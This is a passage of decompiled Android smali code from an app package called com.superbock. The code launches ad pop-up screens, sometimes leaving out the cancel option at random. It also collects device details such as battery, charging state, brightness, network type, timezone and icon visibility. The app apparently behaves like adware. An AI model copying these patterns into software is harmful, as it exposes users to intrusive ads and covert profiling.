    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v7, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Lcom/superbock/bean/AdInfo;->getPkg()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v7, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v2, v1}, Lcom/superbock/bean/AdInfo;->setLink(Ljava/lang/String;)V

    new-instance v1, Lcom/superbock/bean/AdInfo;

    invoke-direct {v1}, Lcom/superbock/bean/AdInfo;-><init>()V

    const/4 v7, 0x2

    invoke-virtual {v1, v7}, Lcom/superbock/bean/AdInfo;->setType(I)V

    invoke-static {}, Le3/d;->a()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v1, v8}, Lcom/superbock/bean/AdInfo;->setTaskId(Ljava/lang/String;)V

    invoke-virtual {v2}, Lcom/superbock/bean/AdInfo;->getCustomId()I

    move-result v8

    invoke-virtual {v1, v8}, Lcom/superbock/bean/AdInfo;->setCustomId(I)V

    invoke-virtual {v2}, Lcom/superbock/bean/AdInfo;->getPkg()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v1, v8}, Lcom/superbock/bean/AdInfo;->setPkg(Ljava/lang/String;)V

    invoke-virtual {v1, v7}, Lcom/superbock/bean/AdInfo;->setUse(I)V

    invoke-virtual {v2}, Lcom/superbock/bean/AdInfo;->getTaskId()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v1, v7}, Lcom/superbock/bean/AdInfo;->setPreId(Ljava/lang/String;)V

    if-eqz v0, :cond_38

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setImg(Ljava/lang/String;)V

    goto :goto_18

    :cond_38
    invoke-virtual {v1, v5}, Lcom/superbock/bean/AdInfo;->setImg(Ljava/lang/String;)V

    :goto_18
    const/16 v0, 0x9

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setTemplate(I)V

    const v0, 0x7f0f002d

    invoke-virtual {v3, v0}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setTitle(Ljava/lang/String;)V

    const v0, 0x7f0f000a

    invoke-virtual {v3, v0}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setMsg(Ljava/lang/String;)V

    const v0, 0x7f0f0020

    invoke-virtual {v3, v0}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setConfirm(Ljava/lang/String;)V

    invoke-virtual {v1, v6}, Lcom/superbock/bean/AdInfo;->setConfirmBgColor(Ljava/lang/String;)V

    invoke-virtual {v1, v14}, Lcom/superbock/bean/AdInfo;->setBgColor(Ljava/lang/String;)V

    new-instance v0, Ljava/util/Random;

    invoke-direct {v0}, Ljava/util/Random;-><init>()V

    const/4 v5, 0x2

    invoke-virtual {v0, v5}, Ljava/util/Random;->nextInt(I)I

    move-result v0

    const/4 v5, 0x1

    if-ne v0, v5, :cond_39

    const v0, 0x7f0f0001

    invoke-virtual {v3, v0}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setCancel(Ljava/lang/String;)V

    :cond_39
    invoke-virtual {v2, v1}, Lcom/superbock/bean/AdInfo;->setAiLink(Lcom/superbock/bean/AdInfo;)V

    invoke-virtual {v2, v10, v11}, Lcom/superbock/bean/AdInfo;->setAiLinkDelayMillis(J)V

    new-instance v0, Lcom/superbock/bean/AdInfo;

    invoke-direct {v0}, Lcom/superbock/bean/AdInfo;-><init>()V

    invoke-virtual {v1}, Lcom/superbock/bean/AdInfo;->getCustomId()I

    move-result v5

    invoke-virtual {v0, v5}, Lcom/superbock/bean/AdInfo;->setCustomId(I)V

    const/4 v5, 0x2

    invoke-virtual {v0, v5}, Lcom/superbock/bean/AdInfo;->setType(I)V

    invoke-static {}, Le3/d;->a()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Lcom/superbock/bean/AdInfo;->setTaskId(Ljava/lang/String;)V

    invoke-virtual {v1}, Lcom/superbock/bean/AdInfo;->getTaskId()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Lcom/superbock/bean/AdInfo;->setPreId(Ljava/lang/String;)V

    const/16 v5, 0x3e9

    invoke-virtual {v0, v5}, Lcom/superbock/bean/AdInfo;->setTemplate(I)V

    new-instance v5, Ljava/util/Random;

    invoke-direct {v5}, Ljava/util/Random;-><init>()V

    const/4 v6, 0x3

    invoke-virtual {v5, v6}, Ljava/util/Random;->nextInt(I)I

    move-result v5

    const/4 v6, 0x1

    if-lt v5, v6, :cond_3a

    invoke-virtual {v0, v6}, Lcom/superbock/bean/AdInfo;->setBack(I)V

    :cond_3a
    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setAiLink(Lcom/superbock/bean/AdInfo;)V

    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/superbock/ui/AdNoticeActivity;

    invoke-direct {v0, v3, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v4, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/io/Serializable;)Landroid/content/Intent;

    invoke-static {v3, v0}, Lk3/d;->e(Landroid/content/Context;Landroid/content/Intent;)V

    goto/16 :goto_1b

    :cond_3b
    move-object/from16 p3, v11

    const/4 v0, 0x2

    invoke-static {v0}, Landroidx/appcompat/view/a;->d(I)Lcom/superbock/bean/AdInfo;

    move-result-object v0

    invoke-static {}, Le3/d;->a()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Lcom/superbock/bean/AdInfo;->setTaskId(Ljava/lang/String;)V

    invoke-virtual {v0, v7}, Lcom/superbock/bean/AdInfo;->setCustomId(I)V

    invoke-virtual {v0, v12}, Lcom/superbock/bean/AdInfo;->setPkg(Ljava/lang/String;)V

    const/4 v2, 0x1

    invoke-virtual {v0, v2}, Lcom/superbock/bean/AdInfo;->setUse(I)V

    invoke-virtual {v0}, Lcom/superbock/bean/AdInfo;->getPkg()Ljava/lang/String;

    move-result-object v2

    invoke-static {v3, v2}, Lk3/e;->c(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    if-eqz v2, :cond_3c

    move-object v11, v2

    goto :goto_19

    :cond_3c
    move-object/from16 v11, p3

    :goto_19
    invoke-virtual {v0, v11}, Lcom/superbock/bean/AdInfo;->setImg(Ljava/lang/String;)V

    const/16 v2, 0x9

    invoke-virtual {v0, v2}, Lcom/superbock/bean/AdInfo;->setTemplate(I)V

    invoke-virtual {v3, v10}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Lcom/superbock/bean/AdInfo;->setTitle(Ljava/lang/String;)V

    invoke-virtual {v3, v9}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Lcom/superbock/bean/AdInfo;->setMsg(Ljava/lang/String;)V

    invoke-virtual {v3, v8}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Lcom/superbock/bean/AdInfo;->setConfirm(Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Lcom/superbock/bean/AdInfo;->setConfirmBgColor(Ljava/lang/String;)V

    new-instance v1, Landroid/content/Intent;

    const-class v2, Lcom/superbock/ui/AdBoxActivity;

    invoke-direct {v1, v3, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v1, v4, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/io/Serializable;)Landroid/content/Intent;

    invoke-static {v3, v1}, Lk3/d;->e(Landroid/content/Context;Landroid/content/Intent;)V

    goto :goto_1b

    :cond_3d
    move-object/from16 p1, v5

    const/4 v0, 0x2

    invoke-static {v0}, Landroidx/appcompat/view/a;->d(I)Lcom/superbock/bean/AdInfo;

    move-result-object v0

    invoke-static {}, Le3/d;->a()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Lcom/superbock/bean/AdInfo;->setTaskId(Ljava/lang/String;)V

    invoke-virtual {v0, v7}, Lcom/superbock/bean/AdInfo;->setCustomId(I)V

    invoke-virtual {v0, v6}, Lcom/superbock/bean/AdInfo;->setPkg(Ljava/lang/String;)V

    const/4 v2, 0x1

    invoke-virtual {v0, v2}, Lcom/superbock/bean/AdInfo;->setUse(I)V

    invoke-virtual {v0}, Lcom/superbock/bean/AdInfo;->getPkg()Ljava/lang/String;

    move-result-object v2

    invoke-static {v3, v2}, Lk3/e;->c(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    if-eqz v2, :cond_3e

    move-object v5, v2

    goto :goto_1a

    :cond_3e
    move-object/from16 v5, p1

    :goto_1a
    invoke-virtual {v0, v5}, Lcom/superbock/bean/AdInfo;->setImg(Ljava/lang/String;)V

    const/16 v2, 0x9

    invoke-virtual {v0, v2}, Lcom/superbock/bean/AdInfo;->setTemplate(I)V

    invoke-virtual {v3, v10}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Lcom/superbock/bean/AdInfo;->setTitle(Ljava/lang/String;)V

    invoke-virtual {v3, v9}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Lcom/superbock/bean/AdInfo;->setMsg(Ljava/lang/String;)V

    invoke-virtual {v3, v8}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Lcom/superbock/bean/AdInfo;->setConfirm(Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Lcom/superbock/bean/AdInfo;->setConfirmBgColor(Ljava/lang/String;)V

    new-instance v1, Landroid/content/Intent;

    const-class v2, Lcom/superbock/ui/AdBoxActivity;

    invoke-direct {v1, v3, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v1, v4, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/io/Serializable;)Landroid/content/Intent;

    invoke-static {v3, v1}, Lk3/d;->e(Landroid/content/Context;Landroid/content/Intent;)V

    :goto_1b
    return-void

    :pswitch_data_0
    .packed-switch 0x65
        :pswitch_1
        :pswitch_1
        :pswitch_1
        :pswitch_1
        :pswitch_0
        :pswitch_1
        :pswitch_1
    .end packed-switch

    :pswitch_data_1
    .packed-switch 0x65
        :pswitch_5
        :pswitch_4
        :pswitch_3
        :pswitch_2
    .end packed-switch

    :pswitch_data_2
    .packed-switch 0xc9
        :pswitch_e
        :pswitch_d
        :pswitch_c
        :pswitch_b
        :pswitch_a
        :pswitch_9
        :pswitch_8
        :pswitch_7
        :pswitch_6
    .end packed-switch

    :pswitch_data_3
    .packed-switch 0x3e9
        :pswitch_17
        :pswitch_16
        :pswitch_15
        :pswitch_14
        :pswitch_13
        :pswitch_12
        :pswitch_11
        :pswitch_10
        :pswitch_f
    .end packed-switch
.end method

.method public final j0(Ls3/g0;IIILjava/lang/String;Ljava/lang/String;)V
    .locals 18
    .param p1    # Ls3/g0;
        .annotation build Landroidx/annotation/NonNull;
        .end annotation
    .end param

    move/from16 v0, p3

    move/from16 v1, p4

    move-object/from16 v2, p5

    move-object/from16 v3, p6

    const-string v4, "na"

    const-string v5, "pk"

    const-string v6, "ty"

    const-string v7, "sta"

    const-string v8, "%"

    new-instance v9, Lf/e;

    invoke-direct {v9}, Lf/e;-><init>()V

    const/16 v10, 0x52a

    invoke-static {v10}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v10

    const-string v11, "code"

    invoke-virtual {v9, v11, v10}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    invoke-static {}, Lg3/m;->a()Lg3/m;

    move-result-object v10

    invoke-static {v10}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;)Ljava/lang/Object;

    const/4 v11, 0x0

    const/4 v12, -0x1

    :try_start_0
    iget-object v13, v10, Lg3/m;->a:Lt2/g;

    invoke-interface {v13}, Lt2/g;->c()Lz2/h;

    move-result-object v13

    const/4 v14, 0x1

    iput-boolean v14, v13, Lz2/h;->l:Z

    invoke-virtual {v13}, Lz2/k;->g()Lz2/m;

    move-result-object v14

    invoke-static {v11}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v15

    invoke-virtual {v14, v7, v15}, Lz2/m;->f(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    if-eq v1, v12, :cond_0

    invoke-virtual {v14}, Lz2/m;->b()Lz2/m;

    invoke-static/range {p4 .. p4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v15

    invoke-virtual {v14, v6, v15}, Lz2/m;->c(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    :cond_0
    invoke-static/range {p5 .. p5}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v15

    if-nez v15, :cond_1

    invoke-virtual {v14}, Lz2/m;->b()Lz2/m;

    invoke-virtual {v14, v5, v2}, Lz2/m;->c(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    :cond_1
    invoke-static/range {p6 .. p6}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v15

    if-nez v15, :cond_2

    invoke-virtual {v14}, Lz2/m;->b()Lz2/m;

    new-instance v15, Ljava/lang/StringBuilder;

    invoke-direct {v15}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v15, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v15

    invoke-virtual {v14, v4, v15}, Lz2/m;->h(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    :cond_2
    iput-object v14, v13, Lz2/k;->g:Lz2/m;

    iget-object v10, v10, Lg3/m;->a:Lt2/g;

    invoke-virtual {v13}, Lz2/k;->f()La3/e;

    move-result-object v13

    invoke-interface {v10, v13}, Lt2/g;->i(Lz2/f;)J

    move-result-wide v13
    :try_end_0
    .catch Ljava/sql/SQLException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    const-wide/16 v13, 0x0

    :goto_0
    invoke-static {v13, v14}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v10

    const-string v13, "total"

    invoke-virtual {v9, v13, v10}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    invoke-static {}, Lg3/m;->a()Lg3/m;

    move-result-object v10

    add-int/lit8 v13, p2, -0x1

    mul-int v13, v13, v0

    int-to-long v13, v13

    move-wide/from16 v16, v13

    int-to-long v12, v0

    invoke-static {v10}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;)Ljava/lang/Object;

    :try_start_1
    iget-object v0, v10, Lg3/m;->a:Lt2/g;

    invoke-interface {v0}, Lt2/g;->c()Lz2/h;

    move-result-object v0

    invoke-virtual {v0, v7, v11}, Lz2/h;->l(Ljava/lang/String;Z)Lz2/h;

    invoke-static/range {v16 .. v17}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v14

    invoke-virtual {v0, v14}, Lz2/h;->k(Ljava/lang/Long;)Lz2/h;

    invoke-static {v12, v13}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v12

    iput-object v12, v0, Lz2/h;->m:Ljava/lang/Long;

    invoke-virtual {v0}, Lz2/k;->g()Lz2/m;

    move-result-object v12

    invoke-static {v11}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v11

    invoke-virtual {v12, v7, v11}, Lz2/m;->f(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    const/4 v7, -0x1

    if-eq v1, v7, :cond_3

    invoke-virtual {v12}, Lz2/m;->b()Lz2/m;

    invoke-static/range {p4 .. p4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    invoke-virtual {v12, v6, v1}, Lz2/m;->c(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    :cond_3
    invoke-static/range {p5 .. p5}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_4

    invoke-virtual {v12}, Lz2/m;->b()Lz2/m;

    invoke-virtual {v12, v5, v2}, Lz2/m;->c(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    :cond_4
    invoke-static/range {p6 .. p6}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_5

    invoke-virtual {v12}, Lz2/m;->b()Lz2/m;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v12, v4, v1}, Lz2/m;->h(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    :cond_5
    iput-object v12, v0, Lz2/k;->g:Lz2/m;

    iget-object v1, v10, Lg3/m;->a:Lt2/g;

    invoke-virtual {v0}, Lz2/k;->f()La3/e;

    move-result-object v0

    invoke-interface {v1, v0}, Lt2/g;->k(Lz2/f;)Ljava/util/List;

    move-result-object v0
    :try_end_1
    .catch Ljava/sql/SQLException; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_1

    :catch_1
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    :goto_1
    const-string v1, "rows"

    invoke-virtual {v9, v1, v0}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    invoke-virtual {v9}, Lf/a;->l()Ljava/lang/String;

    move-result-object v0

    move-object/from16 v1, p1

    invoke-interface {v1, v0}, Ls3/g0;->b(Ljava/lang/String;)Z

    return-void
.end method

.method public final k0(Ls3/g0;III)V
    .locals 10
    .param p1    # Ls3/g0;
        .annotation build Landroidx/annotation/NonNull;
        .end annotation
    .end param

    const-string v0, "ac"

    const-string v1, "ti"

    new-instance v2, Lf/e;

    invoke-direct {v2}, Lf/e;-><init>()V

    const/16 v3, 0x524

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const-string v4, "code"

    invoke-virtual {v2, v4, v3}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    invoke-static {}, Lg3/g;->a()Lg3/g;

    move-result-object v3

    invoke-static {v3}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;)Ljava/lang/Object;

    const/4 v4, 0x3

    const/4 v5, 0x0

    const/4 v6, 0x1

    :try_start_0
    iget-object v7, v3, Lg3/g;->a:Lt2/g;

    invoke-interface {v7}, Lt2/g;->c()Lz2/h;

    move-result-object v7

    iput-boolean v6, v7, Lz2/h;->l:Z

    invoke-virtual {v7}, Lz2/k;->g()Lz2/m;

    move-result-object v8

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v9

    invoke-virtual {v8, v1, v9}, Lz2/m;->f(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    if-eq p4, v4, :cond_0

    invoke-virtual {v8}, Lz2/m;->b()Lz2/m;

    invoke-static {p4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v9

    invoke-virtual {v8, v0, v9}, Lz2/m;->c(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    :cond_0
    iput-object v8, v7, Lz2/k;->g:Lz2/m;

    iget-object v3, v3, Lg3/g;->a:Lt2/g;

    invoke-virtual {v7}, Lz2/k;->f()La3/e;

    move-result-object v7

    invoke-interface {v3, v7}, Lt2/g;->i(Lz2/f;)J

    move-result-wide v7
    :try_end_0
    .catch Ljava/sql/SQLException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    const-wide/16 v7, 0x0

    :goto_0
    invoke-static {v7, v8}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v3

    const-string v7, "total"

    invoke-virtual {v2, v7, v3}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    invoke-static {}, Lg3/g;->a()Lg3/g;

    move-result-object v3

    sub-int/2addr p2, v6

    mul-int p2, p2, p3

    int-to-long v6, p2

    int-to-long p2, p3

    invoke-static {v3}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;)Ljava/lang/Object;

    :try_start_1
    iget-object v8, v3, Lg3/g;->a:Lt2/g;

    invoke-interface {v8}, Lt2/g;->c()Lz2/h;

    move-result-object v8

    invoke-virtual {v8, v1, v5}, Lz2/h;->l(Ljava/lang/String;Z)Lz2/h;

    invoke-static {v6, v7}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v6

    invoke-virtual {v8, v6}, Lz2/h;->k(Ljava/lang/Long;)Lz2/h;

    invoke-static {p2, p3}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object p2

    iput-object p2, v8, Lz2/h;->m:Ljava/lang/Long;

    invoke-virtual {v8}, Lz2/k;->g()Lz2/m;

    move-result-object p2

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object p3

    invoke-virtual {p2, v1, p3}, Lz2/m;->f(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    if-eq p4, v4, :cond_1

    invoke-virtual {p2}, Lz2/m;->b()Lz2/m;

    invoke-static {p4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object p3

    invoke-virtual {p2, v0, p3}, Lz2/m;->c(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    :cond_1
    iput-object p2, v8, Lz2/k;->g:Lz2/m;

    iget-object p2, v3, Lg3/g;->a:Lt2/g;

    invoke-virtual {v8}, Lz2/k;->f()La3/e;

    move-result-object p3

    invoke-interface {p2, p3}, Lt2/g;->k(Lz2/f;)Ljava/util/List;

    move-result-object p2
    :try_end_1
    .catch Ljava/sql/SQLException; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_1

    :catch_1
    move-exception p2

    invoke-virtual {p2}, Ljava/lang/Throwable;->printStackTrace()V

    new-instance p2, Ljava/util/ArrayList;

    invoke-direct {p2}, Ljava/util/ArrayList;-><init>()V

    :goto_1
    const-string p3, "rows"

    invoke-virtual {v2, p3, p2}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    invoke-virtual {v2}, Lf/a;->l()Ljava/lang/String;

    move-result-object p2

    invoke-interface {p1, p2}, Ls3/g0;->b(Ljava/lang/String;)Z

    return-void
.end method

.method public final l0(Ls3/g0;)V
    .locals 9
    .param p1    # Ls3/g0;
        .annotation build Landroidx/annotation/NonNull;
        .end annotation
    .end param

    new-instance v0, Lf/e;

    invoke-direct {v0}, Lf/e;-><init>()V

    const/16 v1, 0x44c

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v2, "code"

    invoke-virtual {v0, v2, v1}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    sget-boolean v1, Lcom/superbock/auto/BaseService;->z:Z

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v2, "black"

    invoke-virtual {v0, v2, v1}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    sget-boolean v1, Lcom/superbock/auto/BaseService;->B:Z

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v2, "forbid"

    invoke-virtual {v0, v2, v1}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    invoke-static {}, Ljava/util/TimeZone;->getDefault()Ljava/util/TimeZone;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/TimeZone;->getID()Ljava/lang/String;

    move-result-object v1

    const-string v2, "timeZone"

    invoke-virtual {v0, v2, v1}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    iget-object v1, p0, Lf3/i$a;->h:Landroid/content/Context;

    const-string v2, "connectivity"

    invoke-virtual {v1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/net/ConnectivityManager;

    invoke-virtual {v1}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object v1

    const/4 v2, -0x1

    if-eqz v1, :cond_0

    invoke-virtual {v1}, Landroid/net/NetworkInfo;->isConnected()Z

    move-result v3

    if-eqz v3, :cond_0

    invoke-virtual {v1}, Landroid/net/NetworkInfo;->getType()I

    move-result v1

    goto :goto_0

    :cond_0
    const/4 v1, -0x1

    :goto_0
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v3, "networkType"

    invoke-virtual {v0, v3, v1}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    iget-object v1, p0, Lf3/i$a;->h:Landroid/content/Context;

    const-string v3, "batterymanager"

    invoke-virtual {v1, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/os/BatteryManager;

    const/4 v4, 0x4

    invoke-virtual {v1, v4}, Landroid/os/BatteryManager;->getIntProperty(I)I

    move-result v1

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v4, "batteryCapacity"

    invoke-virtual {v0, v4, v1}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    iget-object v1, p0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-virtual {v1, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/os/BatteryManager;

    const/4 v3, 0x6

    invoke-virtual {v1, v3}, Landroid/os/BatteryManager;->getIntProperty(I)I

    move-result v1

    const/4 v3, 0x2

    const/4 v4, 0x0

    const/4 v5, 0x1

    if-ne v1, v3, :cond_1

    const/4 v1, 0x1

    goto :goto_1

    :cond_1
    const/4 v1, 0x0

    :goto_1
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v3, "isCharging"

    invoke-virtual {v0, v3, v1}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    sget-boolean v1, Lf3/i;->b:Z

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v3, "media"

    invoke-virtual {v0, v3, v1}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    iget-object v1, p0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-static {v1}, Lk3/d;->d(Landroid/content/Context;)Z

    move-result v1

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v3, "iconStatus"

    invoke-virtual {v0, v3, v1}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    iget-object v1, p0, Lf3/i$a;->h:Landroid/content/Context;

    :try_start_0
    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    const-string v3, "screen_brightness"

    invoke-static {v1, v3}, Landroid/provider/Settings$System;->getInt(Landroid/content/ContentResolver;Ljava/lang/String;)I

    move-result v2
    :try_end_0
    .catch Landroid/provider/Settings$SettingNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_2

    :catch_0
    nop

    :goto_2
    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v2, "brightness"

    invoke-virtual {v0, v2, v1}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    invoke-static {}, Lcom/superbock/auto/BaseService;->l()Z

    move-result v1

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v2, "isWorking"

